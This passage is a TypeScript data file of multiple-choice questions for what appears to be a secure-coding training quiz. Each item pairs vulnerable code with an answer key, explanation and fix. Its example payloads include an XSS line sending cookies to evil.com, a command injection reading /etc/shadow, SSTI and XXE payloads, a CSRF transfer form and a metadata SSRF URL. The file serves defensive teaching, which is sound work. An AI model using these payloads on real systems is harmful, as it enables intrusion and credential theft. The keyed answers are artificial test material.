import type { Category, Question } from '../types';

export const CATEGORIES: Category[] = [
  "Injection",
  "Frontend & Web",
  "Authentication & Secrets",
  "Architecture & Config",
  "Data Integrity",
  "Access Control"
];

export const QUESTIONS: Question[] = [
  // ── INJECTION ────────────────────────────────────────────────────────────
  {
    id: 1,
    category: "Injection",
    title: "SQL Injection",
    language: "Python",
    difficulty: "CRITICAL",
    timeLimit: 45,
    diffColor: "#EF4444",
    code: `def get_user(username):
    query = "SELECT * FROM users WHERE "
            "username = '" + username + "'"
    return db.execute(query)

# Called with user input:
get_user("admin' OR '1'='1")`,
    question: "What vulnerability exists in this database query?",
    options: [
      "Missing input validation length check",
      "SQL Injection via unsanitized string concatenation",
      "Missing database connection pooling",
      "Incorrect SQL syntax for multi-line strings",
    ],
    correct: 1,
    explanation: "User input is concatenated directly into the SQL string. An attacker can inject 'admin' OR '1'='1' to bypass authentication and dump the entire users table.",
    fix: `def get_user(username):\n    query = "SELECT * FROM users WHERE username = ?"\n    return db.execute(query, (username,))  # Parameterized query`,
  },
  {
    id: 6,
    category: "Injection",
    title: "Command Injection",
    language: "Python",
    difficulty: "CRITICAL",
    timeLimit: 45,
    diffColor: "#EF4444",
    code: `import os
from flask import Flask, request
app = Flask(__name__)

@app.route('/ping')
def ping():
    host = request.args.get('host', '')
    result = os.popen(f'ping -c 4 {host}').read()
    return f'<pre>{result}</pre>'`,
    question: "What attack is possible via the 'host' parameter?",
    options: [
      "HTTP Parameter Pollution",
      "OS Command Injection via shell metacharacters",
      "Denial of Service via ICMP flood",
      "Server-Side Template Injection",
    ],
    correct: 1,
    explanation: "Any shell metacharacter (;, |, &&) can chain arbitrary commands (e.g., host=8.8.8.8;cat /etc/shadow).",
    fix: `import subprocess\ndef ping():\n    host = request.args.get('host', '')\n    result = subprocess.run(['ping', '-c', '4', host], capture_output=True)\n    return result.stdout`,
  },
  {
    id: 17,
    category: "Injection",
    title: "Server-Side Template Injection (SSTI)",
    language: "Python",
    difficulty: "CRITICAL",
    timeLimit: 45,
    diffColor: "#EF4444",
    code: `from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    # Vulnerable pattern
    template = f'<h1>Hello, {name}!</h1>'
    return render_template_string(template)`,
    question: "What payload could an attacker use to exploit this via Jinja2?",
    options: [
      "<script>alert(1)</script>",
      "'; DROP TABLE users--",
      "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
      "../etc/passwd",
    ],
    correct: 2,
    explanation: "Because user input is concatenated into the template string BEFORE it is parsed, the template engine executes the Jinja2 payload, which can access Python's underlying OS modules for RCE.",
    fix: `// Pass the variable as context, not string concatenation\ntemplate = '<h1>Hello, {{ name }}!</h1>'\nreturn render_template_string(template, name=name)`,
  },
  {
    id: 19,
    category: "Injection",
    title: "NoSQL Injection",
    language: "Node.js",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `// Express + MongoDB (Mongoose)
app.post('/api/login', async (req, res) => {
  // req.body = { username: "admin", password: { "$gt": "" } }

  const user = await User.findOne({
    username: req.body.username,
    password: req.body.password
  });

  if (user) {
    res.json({ token: generateToken(user) });
  } else {
    res.status(401).send('Invalid');
  }
});`,
    question: "How does the payload in the comment bypass authentication?",
    options: [
      "It causes an error that crashes the database service.",
      "The $gt operator evaluates to true for any non-empty password.",
      "It overrides the username field.",
      "It executes a JavaScript function inside MongoDB.",
    ],
    correct: 1,
    explanation: "MongoDB queries treat objects like {$gt: ''} as query operators. The password is greater than an empty string for every user, so MongoDB returns the user record without a password check.",
    fix: `// Force variables to be strings before querying\nconst username = String(req.body.username);\nconst password = String(req.body.password);`,
  },
  {
    id: 21,
    category: "Injection",
    title: "LDAP Injection",
    language: "Python",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `from ldap3 import Server, Connection

def authenticate(username, password):
    server = Server('ldap://corp.internal')
    conn = Connection(server)
    conn.bind()
    filter_str = f"(&(uid={username})(userPassword={password}))"
    conn.search('dc=corp,dc=com', filter_str)
    return len(conn.entries) > 0

# authenticate("*)(uid=*))(|(uid=*", "x")`,
    question: "What does the injected username in the comment achieve?",
    options: [
      "It crashes the LDAP server with a malformed filter",
      "It rewrites the filter to match any user regardless of password",
      "It dumps the full directory tree over LDAP",
      "It modifies user entries in the directory",
    ],
    correct: 1,
    explanation: "The payload closes the uid condition and injects (|(uid=*)), making the filter match every entry. The attacker authenticates as the first directory user without a valid password.",
    fix: `from ldap3.utils.dn import escape_rdn\nusername = escape_rdn(username)\npassword = escape_rdn(password)\nfilter_str = f"(&(uid={username})(userPassword={password}))"`,
  },
  {
    id: 22,
    category: "Injection",
    title: "HTTP Header Injection (CRLF)",
    language: "Node.js",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `app.get('/set-lang', (req, res) => {
  const lang = req.query.lang;
  res.setHeader('Set-Cookie', \`lang=\${lang}; Path=/\`);
  res.redirect('/');
});

// Attacker URL:
// /set-lang?lang=en%0d%0aSet-Cookie:%20admin=true`,
    question: "What does %0d%0a in the lang parameter enable?",
    options: [
      "A buffer overflow in the HTTP parser",
      "Injection of additional HTTP headers into the response",
      "A reflected XSS via the cookie value",
      "Bypassing Content-Security-Policy",
    ],
    correct: 1,
    explanation: "%0d%0a is URL-encoded CRLF. HTTP headers are CRLF-delimited, so the attacker terminates the Set-Cookie header and injects a new one. The server sends both headers to the victim's browser.",
    fix: `const ALLOWED = ['en', 'fr', 'de', 'es'];\nconst lang = ALLOWED.includes(req.query.lang) ? req.query.lang : 'en';\nres.setHeader('Set-Cookie', \`lang=\${lang}; Path=/\`);`,
  },
  {
    id: 23,
    category: "Injection",
    title: "Blind SQL Injection",
    language: "Python",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `@app.route('/user')
def user_profile():
    user_id = request.args.get('id', '')
    result = db.execute(
        f"SELECT name FROM users WHERE id = {user_id}"
    )
    row = result.fetchone()

    if row:
        return jsonify({"name": row[0]})
    return abort(404)

# Probe: /user?id=1 AND SLEEP(5)`,
    question: "Why can an attacker exfiltrate data using only 200/404 responses?",
    options: [
      "404 responses include full error tracebacks",
      "Boolean or time-based conditions reveal one bit of data per request",
      "SLEEP exposes the database engine type in the response",
      "HTTP status codes bypass WAF filtering rules",
    ],
    correct: 1,
    explanation: "Without visible data, attackers infer information through true/false conditions or timing side-channels. Thousands of requests dump an entire database one character at a time — no visible output needed.",
    fix: `result = db.execute(\n    "SELECT name FROM users WHERE id = ?",\n    (user_id,)\n)`,
  },

  // ── FRONTEND & WEB ────────────────────────────────────────────────────────
  {
    id: 2,
    category: "Frontend & Web",
    title: "Cross-Site Scripting (XSS)",
    language: "JavaScript",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `// Express.js route handler
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(\`<h2>Results for: \${query}</h2>\`);
});`,
    question: "What attack vector does this endpoint expose?",
    options: [
      "Server-Side Request Forgery (SSRF)",
      "Reflected Cross-Site Scripting (XSS)",
      "HTTP Response Splitting",
      "Directory Traversal",
    ],
    correct: 1,
    explanation: "The query param is embedded directly in HTML without escaping. Visiting ?q=<script>document.location='http://evil.com?c='+document.cookie</script> steals session cookies.",
    fix: `import escapeHtml from 'escape-html';\n\napp.get('/search', (req, res) => {\n  const query = escapeHtml(req.query.q || '');\n  res.send(\`<h2>Results for: \${query}</h2>\`);\n});`,
  },
  {
    id: 9,
    category: "Frontend & Web",
    title: "Cross-Site Request Forgery (CSRF)",
    language: "HTML",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `<form action="https://bank.com/transfer" method="POST" id="steal">
  <input type="hidden" name="to_account" value="attacker_acct">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('steal').submit();</script>`,
    question: "Why would this attack succeed if the victim is currently logged into bank.com?",
    options: [
      "The bank lacks CORS headers.",
      "The browser automatically includes the victim's session cookies.",
      "The attacker's site bypassed the Same-Origin Policy.",
      "The form uses HTTP instead of HTTPS.",
    ],
    correct: 1,
    explanation: "The browser automatically sends the user's session cookies with the cross-origin request. Without anti-CSRF tokens, the server processes it as the victim.",
    fix: `\n<input type="hidden" name="csrf_token" value="abc123xyz_unpredictable_token">`,
  },
  {
    id: 14,
    category: "Frontend & Web",
    title: "Prototype Pollution",
    language: "JavaScript",
    difficulty: "CRITICAL",
    timeLimit: 45,
    diffColor: "#EF4444",
    code: `function mergeDeep(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      mergeDeep(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
// req.body = {"__proto__": {"isAdmin": true}}
mergeDeep({}, req.body);`,
    question: "What happens when the provided JSON is merged?",
    options: [
      "The server crashes due to an infinite loop.",
      "The Global Object prototype is modified, affecting all objects.",
      "The target object becomes immutable.",
      "A prototype closure bypasses garbage collection.",
    ],
    correct: 1,
    explanation: "Because the function doesn't check for '__proto__', the assignment `target['__proto__']['isAdmin'] = true` pollutes the global Object prototype. Now EVERY object in the Node process has `.isAdmin === true`.",
    fix: `// Block prototype keys\nif (key === '__proto__' || key === 'constructor' || key === 'prototype') {\n  continue;\n}`,
  },
  {
    id: 15,
    category: "Frontend & Web",
    title: "Unvalidated Redirects",
    language: "PHP",
    difficulty: "MEDIUM",
    timeLimit: 75,
    diffColor: "#EAB308",
    code: `<?php
session_start();

if (login_successful($_POST['user'], $_POST['pass'])) {
    $_SESSION['logged_in'] = true;

    // Redirect back to the page they came from
    $next = $_GET['next'] ?? '/dashboard.php';
    header("Location: " . $next);
    exit;
}
?>`,
    question: "What is the security risk of using the 'next' parameter directly?",
    options: [
      "It allows HTTP Header Injection.",
      "It enables Open Redirect for phishing attacks.",
      "It exposes session IDs in the URL.",
      "It causes an infinite redirect loop.",
    ],
    correct: 1,
    explanation: "An attacker sends a link like login.php?next=http://evil.com. After the victim logs in, they are seamlessly redirected to the attacker's phishing page.",
    fix: `$next = $_GET['next'] ?? '/dashboard.php';\nif (!preg_match('/^\/[a-zA-Z0-9_\\-\\.]+$/', $next)) {\n    $next = '/dashboard.php';\n}`,
  },
  {
    id: 18,
    category: "Frontend & Web",
    title: "Clickjacking",
    language: "HTML",
    difficulty: "MEDIUM",
    timeLimit: 75,
    diffColor: "#EAB308",
    code: `HTTP/1.1 200 OK
Content-Type: text/html
Cache-Control: no-cache

<!DOCTYPE html>
<html>
<body>
  <h2>Delete Your Account</h2>
  <form action="/account/delete" method="POST">
    <button type="submit">Permanently Delete</button>
  </form>
</body>
</html>`,
    question: "What HTTP response header is missing to prevent UI Redressing (Clickjacking)?",
    options: [
      "Strict-Transport-Security",
      "X-Frame-Options or Content-Security-Policy: frame-ancestors",
      "X-Content-Type-Options: nosniff",
      "Access-Control-Allow-Origin",
    ],
    correct: 1,
    explanation: "Without X-Frame-Options: DENY or CSP: frame-ancestors 'none', an attacker loads this page in an invisible iframe, tricking the user into clicking the delete button.",
    fix: `res.setHeader('X-Frame-Options', 'DENY');\nres.setHeader('Content-Security-Policy', "frame-ancestors 'none'");`,
  },
  {
    id: 24,
    category: "Frontend & Web",
    title: "DOM-Based XSS",
    language: "JavaScript",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `// Shows a 'referred by' message from the URL hash
document.addEventListener('DOMContentLoaded', () => {
  const hash = window.location.hash;
  const ref = hash.replace('#ref=', '');

  document.getElementById('msg').innerHTML =
    'Referred by: ' + ref;
});

// URL: https://site.com/#ref=<img src=x onerror=alert(1)>`,
    question: "Why does this DOM XSS completely bypass server-side WAF filters?",
    options: [
      "The URL hash is never sent in HTTP requests",
      "innerHTML is sandboxed from DOM access in modern browsers",
      "The DOMContentLoaded event fires before the HTTP request",
      "The onerror attribute is stripped by HTML parsers",
    ],
    correct: 0,
    explanation: "The URL fragment (#ref=...) is processed only client-side and never transmitted to the server. Server-side WAFs, filters, and access logs never see the payload. The attacker directly controls what is passed to innerHTML.",
    fix: `// Use textContent — renders text, never executes HTML\ndocument.getElementById('msg').textContent = 'Referred by: ' + ref;`,
  },
  {
    id: 25,
    category: "Frontend & Web",
    title: "Insecure Cookie Flags",
    language: "Node.js",
    difficulty: "MEDIUM",
    timeLimit: 75,
    diffColor: "#EAB308",
    code: `app.post('/login', (req, res) => {
  // ...validate credentials...

  res.cookie('session_id', generateSessionId(), {
    maxAge: 86400000,
    path: '/',
    domain: 'app.company.com',
    // No other options set
  });

  res.redirect('/dashboard');
});`,
    question: "Which two missing flags create the highest combined risk?",
    options: [
      "expires and encode",
      "HttpOnly and Secure",
      "SameSite and signed",
      "path and partitioned",
    ],
    correct: 1,
    explanation: "Missing HttpOnly means JavaScript (including XSS payloads) can read document.cookie and exfiltrate the session token. Missing Secure means the cookie transmits over plain HTTP, enabling network interception.",
    fix: `res.cookie('session_id', generateSessionId(), {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict',\n  maxAge: 86400000,\n});`,
  },
  {
    id: 26,
    category: "Frontend & Web",
    title: "Missing Subresource Integrity",
    language: "HTML",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `<!DOCTYPE html>
<html>
<head>
  <!-- Loads jQuery directly from a third-party CDN -->
  <script src="https://cdn.example.com/jquery-3.7.1.min.js"></script>
</head>
<body>
  <!-- App code that sends auth tokens via jQuery -->
  <script src="/app.js"></script>
</body>
</html>`,
    question: "If the CDN is compromised and serves a tampered file, what is the impact?",
    options: [
      "The page fails to load due to CORS restrictions",
      "The browser detects changes via HTTPS certificate pinning",
      "Malicious code in the CDN script executes with full page access",
      "The CSP default-src directive blocks unauthorized scripts",
    ],
    correct: 2,
    explanation: "Without an integrity hash, the browser trusts whatever the CDN serves. A compromised CDN or BGP hijack can deliver a keylogger or token exfiltration script with full origin trust on your domain.",
    fix: `<script\n  src="https://cdn.example.com/jquery-3.7.1.min.js"\n  integrity="sha384-..."\n  crossorigin="anonymous"\n></script>`,
  },

  // ── AUTHENTICATION & SECRETS ──────────────────────────────────────────────
  {
    id: 3,
    category: "Authentication & Secrets",
    title: "Hardcoded Credentials",
    language: "Java",
    difficulty: "CRITICAL",
    timeLimit: 45,
    diffColor: "#EF4444",
    code: `public class DatabaseConfig {
    private static final String DB_URL = "jdbc:mysql://prod:3306/users";
    private static final String DB_USER = "root";
    private static final String DB_PASS = "Sup3rS3cr3t!2024";

    public static Connection getConnection() {
        return DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
    }
}`,
    question: "What is the primary security risk in this Java class?",
    options: [
      "Using JDBC instead of JPA/Hibernate",
      "Static methods instead of dependency injection",
      "Hardcoded production credentials in source code",
      "Missing connection timeout configuration",
    ],
    correct: 2,
    explanation: "Credentials committed to source code are exposed to anyone with repo access, exist in git history forever, and end up in every deployment artifact and container image.",
    fix: `public static Connection getConnection() {\n    String url  = System.getenv("DB_URL");\n    String user = System.getenv("DB_USER");\n    String pass = System.getenv("DB_PASS");\n    return DriverManager.getConnection(url, user, pass);\n}`,
  },
  {
    id: 8,
    category: "Authentication & Secrets",
    title: "JWT Algorithm Confusion",
    language: "JavaScript",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `const jwt = require('jsonwebtoken');

app.post('/verify', (req, res) => {
  const { token } = req.body;
  const publicKey = fs.readFileSync('public.pem');

  try {
    // Vulnerable: accepts any algorithm from token header
    const payload = jwt.verify(token, publicKey);
    res.json({ valid: true, user: payload });
  } catch (e) { res.json({ valid: false }); }
});`,
    question: "How can an attacker forge a valid JWT with this code?",
    options: [
      "By brute-forcing the public key",
      "By setting alg:none in the header",
      "By using the public key as HMAC secret with alg:HS256",
      "By replaying an expired token",
    ],
    correct: 2,
    explanation: "Algorithm confusion attack: the attacker changes the header to alg:HS256, then signs with the PUBLIC key. The server uses the public key as the HMAC secret — exactly what the attacker signed with.",
    fix: `const payload = jwt.verify(token, publicKey, {\n  algorithms: ['RS256'] // Explicitly whitelist algorithm\n});`,
  },
  {
    id: 11,
    category: "Authentication & Secrets",
    title: "Weak Password Hashing",
    language: "PHP",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `function register_user($username, $password) {
    global $db;

    // Hash the password before storing
    $hashed_password = md5($password);

    $stmt = $db->prepare("INSERT INTO users (user, pass) VALUES (?, ?)");
    $stmt->execute([$username, $hashed_password]);
}`,
    question: "Why is this password storage mechanism considered highly insecure?",
    options: [
      "MD5 is prone to SQL injection vulnerabilities.",
      "MD5 is a fast, unsalted hash — vulnerable to dictionary and rainbow table attacks.",
      "The execute() function requires string concatenation for MD5.",
      "MD5 generates unpredictable string lengths.",
    ],
    correct: 1,
    explanation: "MD5 is cryptographically broken and computationally fast. It also lacks a unique salt per user, meaning identical passwords produce identical hashes, enabling efficient precomputed attacks.",
    fix: `// Use bcrypt or argon2id with a built-in random salt\n$hashed_password = password_hash($password, PASSWORD_DEFAULT);`,
  },
  {
    id: 27,
    category: "Authentication & Secrets",
    title: "API Key in Client-Side Bundle",
    language: "JavaScript",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `// src/services/ai.js — compiled into the public JS bundle
const AI_API_KEY  = 'sk-proj-AbCdEfGhIjKlMnOpQrStUvLxYz';
const STRIPE_KEY  = 'sk_live_xGt9Kp2vQm8nRz4wY7uW1aBC';

export async function generateSummary(text) {
  return fetch('https://api.openai.com/v1/chat/completions', {
    method: 'POST',
    headers: { 'Authorization': \`Bearer \${AI_API_KEY}\` },
    body: JSON.stringify({ model: 'gpt-4o', messages: [{ role:'user', content: text }] }),
  });
}`,
    question: "Beyond DevTools exposure, what makes this permanently dangerous?",
    options: [
      "The fetch API leaks memory in Chromium-based browsers",
      "Keys in bundles persist in CDN caches and crawlers even after rotation",
      "Bearer tokens bypass TLS inspection on corporate proxies",
      "Module exports are readable via window.__modules__ globally",
    ],
    correct: 1,
    explanation: "JS bundles are cached by CDNs, browser caches, and security crawlers. Even after key rotation, old cached bundles retain the original key. The sk_live_ Stripe key could enable fraudulent charges before rotation.",
    fix: `// Secret keys must live only on the server\nexport async function generateSummary(text) {\n  return fetch('/api/ai/summarize', {\n    method: 'POST',\n    body: JSON.stringify({ text }),\n  });\n}`,
  },
  {
    id: 28,
    category: "Authentication & Secrets",
    title: "JWT Stored in localStorage",
    language: "JavaScript",
    difficulty: "MEDIUM",
    timeLimit: 75,
    diffColor: "#EAB308",
    code: `async function login(email, password) {
  const res = await fetch('/api/auth/login', {
    method: 'POST',
    body: JSON.stringify({ email, password }),
  });
  const { token } = await res.json();

  // Persist token for API requests
  localStorage.setItem('jwt', token);
  window.location.href = '/dashboard';
}

// API calls use: Authorization: Bearer [token from localStorage]`,
    question: "Why is localStorage a dangerous place to store a JWT?",
    options: [
      "localStorage is cleared when the browser tab closes",
      "Any JavaScript on the page — including XSS scripts — can read localStorage",
      "localStorage values cannot be sent in HTTP Authorization headers",
      "localStorage is not available in private browsing mode",
    ],
    correct: 1,
    explanation: "Unlike HttpOnly cookies, localStorage is fully accessible to JavaScript. A single XSS payload anywhere on the site can call localStorage.getItem('jwt') and send the token to an attacker-controlled server.",
    fix: `// Store the JWT in an HttpOnly cookie (server sets it):\n// Set-Cookie: jwt=...; HttpOnly; Secure; SameSite=Strict\n// The browser sends it automatically — JS cannot read it.`,
  },
  {
    id: 29,
    category: "Authentication & Secrets",
    title: "OAuth Redirect URI Manipulation",
    language: "Node.js",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `app.get('/oauth/callback', async (req, res) => {
  const { code, redirect_uri } = req.query;

  const tokens = await exchangeCodeForToken(code);

  // Send user back to where they started
  if (redirect_uri) {
    return res.redirect(redirect_uri + '?token=' + tokens.access_token);
  }
  res.redirect('/dashboard');
});`,
    question: "How can an attacker steal access tokens using this endpoint?",
    options: [
      "By replaying the authorization code before it expires",
      "By setting redirect_uri to their own server to receive the token",
      "By injecting JavaScript into the redirect_uri value",
      "By modifying the token payload during code exchange",
    ],
    correct: 1,
    explanation: "The access token is appended to whatever redirect_uri the attacker provides. The victim is redirected to attacker.com?token=... and the attacker's server logs the token, enabling account takeover.",
    fix: `const SAFE = ['/dashboard', '/settings', '/profile'];\nconst dest = SAFE.includes(redirect_uri) ? redirect_uri : '/dashboard';\nreturn res.redirect(dest);`,
  },

  // ── ARCHITECTURE & CONFIG ─────────────────────────────────────────────────
  {
    id: 4,
    category: "Architecture & Config",
    title: "Path Traversal",
    language: "Node.js",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `app.get('/file', (req, res) => {
  const filename = req.query.name;
  const filePath = path.join('/var/www/files/', filename);
  res.sendFile(filePath);
});
// Request: GET /file?name=../../../etc/passwd`,
    question: "What vulnerability allows reading /etc/passwd here?",
    options: [
      "Missing file extension validation",
      "Path traversal via directory sequences in filename",
      "Insecure file permissions on the server",
      "Missing CORS headers on the endpoint",
    ],
    correct: 1,
    explanation: "The filename ../../../etc/passwd traverses outside the intended directory. path.join doesn't prevent this — it resolves the full path.",
    fix: `app.get('/file', (req, res) => {\n  const filename = path.basename(req.query.name); // strips ../ \n  const filePath = path.join('/var/www/files/', filename);\n  res.sendFile(filePath);\n});`,
  },
  {
    id: 10,
    category: "Architecture & Config",
    title: "Server-Side Request Forgery (SSRF)",
    language: "Python",
    difficulty: "CRITICAL",
    timeLimit: 45,
    diffColor: "#EF4444",
    code: `import requests
from flask import Flask, request

@app.route('/fetch-preview')
def fetch_preview():
    url = request.args.get('url')
    response = requests.get(url)
    return response.content

# Attack: /fetch-preview?url=http://169.254.169.254/latest/meta-data/`,
    question: "What is the attacker trying to achieve with the URL in the comment?",
    options: [
      "Execute a buffer overflow on the local network",
      "Bypass the web application firewall (WAF)",
      "Access internal cloud metadata and steal temporary IAM credentials",
      "Perform a Denial of Service via recursive DNS queries",
    ],
    correct: 2,
    explanation: "By controlling the URL the server fetches, the attacker forces it to query the AWS metadata IP (169.254.169.254), exposing temporary IAM credentials with potentially wide cloud permissions.",
    fix: `// Validate URL, resolve IP, and block private/internal IP ranges (e.g., 10.x.x.x, 169.254.x.x)`,
  },
  {
    id: 13,
    category: "Architecture & Config",
    title: "CORS Misconfiguration",
    language: "Node.js",
    difficulty: "MEDIUM",
    timeLimit: 75,
    diffColor: "#EAB308",
    code: `const cors = require('cors');

app.use(cors({
  origin: (origin, callback) => {
    // Check if origin ends with company.com
    if (origin && origin.endsWith('company.com')) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));`,
    question: "How can an attacker bypass this CORS policy?",
    options: [
      "By sending a preflight OPTIONS request",
      "By registering a domain like 'evilcompany.com'",
      "By omitting the Origin header entirely",
      "By using an iframe to load the page",
    ],
    correct: 1,
    explanation: "The endsWith() check is flawed. Registering 'evilcompany.com' passes the check. The attacker makes credentialed cross-origin requests from their domain and receives the authenticated responses.",
    fix: `const allowedOrigins = ['https://app.company.com', 'https://api.company.com'];\nif (allowedOrigins.includes(origin)) { callback(null, true); }`,
  },
  {
    id: 16,
    category: "Architecture & Config",
    title: "Missing Rate Limiting",
    language: "Node.js",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `app.post('/api/auth/reset-password', async (req, res) => {
  const { email } = req.body;
  const user = await db.users.findOne({ email });

  if (user) {
    const code = generate6DigitCode(); // e.g. 123456
    await emailService.sendResetCode(user.email, code);
  }

  res.json({ message: "If the email exists, a code was sent." });
});`,
    question: "Besides email flooding, what is the critical flaw if the verification endpoint also lacks rate limits?",
    options: [
      "A 6-digit code can be brute-forced in under 1,000,000 attempts.",
      "The endpoint is vulnerable to timing attacks.",
      "The database connection pool will exhaust.",
      "The random number generator is predictable.",
    ],
    correct: 0,
    explanation: "A 6-digit code has only 1,000,000 combinations. Without rate limiting on the verification endpoint, an attacker can submit all possibilities in minutes and take over any account.",
    fix: `const rateLimit = require('express-rate-limit');\napp.use('/api/auth/', rateLimit({ windowMs: 15 * 60 * 1000, max: 5 }));`,
  },
  {
    id: 30,
    category: "Architecture & Config",
    title: "Verbose Error Disclosure",
    language: "PHP",
    difficulty: "MEDIUM",
    timeLimit: 75,
    diffColor: "#EAB308",
    code: `<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

try {
    $db = new PDO(
        "mysql:host=10.0.1.45;dbname=users_prod",
        "admin",
        "dbpass123!"
    );
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());
}
?>`,
    question: "What attacker-useful information is leaked in this error output?",
    options: [
      "The PHP version and underlying OS architecture",
      "Internal host IP, database name, username, and password",
      "The webserver SSL certificate and private key path",
      "Server memory layout for ROP chain construction",
    ],
    correct: 1,
    explanation: "The PDO exception includes the full DSN: internal IP (10.0.1.45), database name (users_prod), plus the hardcoded username and password. An attacker can connect to the database directly.",
    fix: `ini_set('display_errors', 0);\n} catch (PDOException $e) {\n    error_log("DB failed: " . $e->getMessage());\n    die("Service temporarily unavailable.");\n}`,
  },
  {
    id: 31,
    category: "Architecture & Config",
    title: "Insecure TLS Configuration",
    language: "Node.js",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `const https = require('https');
const constants = require('constants');

const server = https.createServer({
  key:  fs.readFileSync('server.key'),
  cert: fs.readFileSync('server.crt'),

  // Legacy compatibility mode
  secureProtocol: 'SSLv23_method',
  secureOptions:  constants.SSL_OP_NO_SSLv2,
  ciphers: 'ALL',
}, app);`,
    question: "Which deprecated protocol remains active in this configuration?",
    options: [
      "TLS 1.3 is disabled by SSLv23_method",
      "SSLv3 is still active and vulnerable to POODLE",
      "HTTP/1.1 is forced by the ALL cipher suite",
      "DTLS is enabled by the legacy compatibility flag",
    ],
    correct: 1,
    explanation: "SSL_OP_NO_SSLv2 disables SSL 2.0 only. SSL 3.0 remains active — vulnerable to the POODLE attack, which allows a MITM attacker to decrypt HTTPS traffic via a downgrade.",
    fix: `{\n  minVersion: 'TLSv1.2',\n  ciphers: [\n    'TLS_AES_256_GCM_SHA384',\n    'TLS_CHACHA20_POLY1305_SHA256',\n    'ECDHE-RSA-AES256-GCM-SHA384',\n  ].join(':'),\n}`,
  },
  {
    id: 32,
    category: "Architecture & Config",
    title: "Container Running as Root",
    language: "Dockerfile",
    difficulty: "MEDIUM",
    timeLimit: 75,
    diffColor: "#EAB308",
    code: `FROM node:20-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .

EXPOSE 3000
CMD ["node", "server.js"]

# No USER instruction — runs as UID 0 by default`,
    question: "Why is running a container as root dangerous even inside Docker?",
    options: [
      "Root inside the container has UID 0 which maps to host root if the container escapes",
      "Docker automatically strips root via seccomp before exec",
      "Running as root prevents Node.js from binding to port 3000",
      "Alpine Linux does not support root users in containers",
    ],
    correct: 0,
    explanation: "If an attacker exploits the app and escapes the container via a kernel vulnerability or misconfigured volume mount, the process runs as UID 0 on the host, enabling full machine compromise.",
    fix: `RUN addgroup -S appgroup && adduser -S appuser -G appgroup\nUSER appuser\nCMD ["node", "server.js"]`,
  },

  // ── DATA INTEGRITY ────────────────────────────────────────────────────────
  {
    id: 5,
    category: "Data Integrity",
    title: "Insecure Deserialization",
    language: "PHP",
    difficulty: "CRITICAL",
    timeLimit: 45,
    diffColor: "#EF4444",
    code: `<?php
$userData = unserialize(base64_decode($_COOKIE['user_data']));
echo "Welcome, " . $userData['username'];

class Logger {
    public $logFile;
    public function __destruct() {
        file_put_contents($this->logFile, "logged");
    }
}
?>`,
    question: "What makes this deserialization dangerous?",
    options: [
      "Base64 encoding is not secure encryption",
      "Cookie size limits may truncate the data",
      "Unserializing untrusted data enables remote code execution",
      "The Logger class should use static methods",
    ],
    correct: 2,
    explanation: "PHP unserialize() on attacker-controlled input triggers magic methods (__destruct). The attacker crafts a Logger object pointing logFile to an arbitrary path and achieves RCE.",
    fix: `// Use JSON and signed tokens instead of native serialization\n$userData = json_decode(base64_decode($data), true);`,
  },
  {
    id: 12,
    category: "Data Integrity",
    title: "XML External Entity (XXE)",
    language: "Java",
    difficulty: "CRITICAL",
    timeLimit: 45,
    diffColor: "#EF4444",
    code: `public void parseXml(InputStream xmlStream) throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    DocumentBuilder builder = factory.newDocumentBuilder();
    Document doc = builder.parse(xmlStream);
}

/* Attack payload:
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo> */`,
    question: "What vulnerability is present in this standard XML parser configuration?",
    options: [
      "It fails to validate the XML against an XSD schema.",
      "It processes external entities by default, allowing local file inclusion.",
      "It is vulnerable to XPath injection due to standard libraries.",
      "The DocumentBuilder consumes excessive memory.",
    ],
    correct: 1,
    explanation: "Many XML parsers resolve external entities by default. The attacker defines an entity pointing to a local file, which the parser reads and embeds in the response.",
    fix: `// Disable DTDs completely to prevent XXE\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`,
  },
  {
    id: 33,
    category: "Data Integrity",
    title: "Mass Assignment",
    language: "Python",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `@app.route('/api/users/me', methods=['PUT'])
@login_required
def update_profile():
    user = User.query.get(current_user.id)

    # Apply all fields from request body
    for key, value in request.json.items():
        setattr(user, key, value)

    db.session.commit()
    return jsonify(user.to_dict())

# Attacker sends:
# {"name": "Alice", "is_admin": true, "credit_balance": 9999}`,
    question: "What allows the attacker payload to escalate privileges?",
    options: [
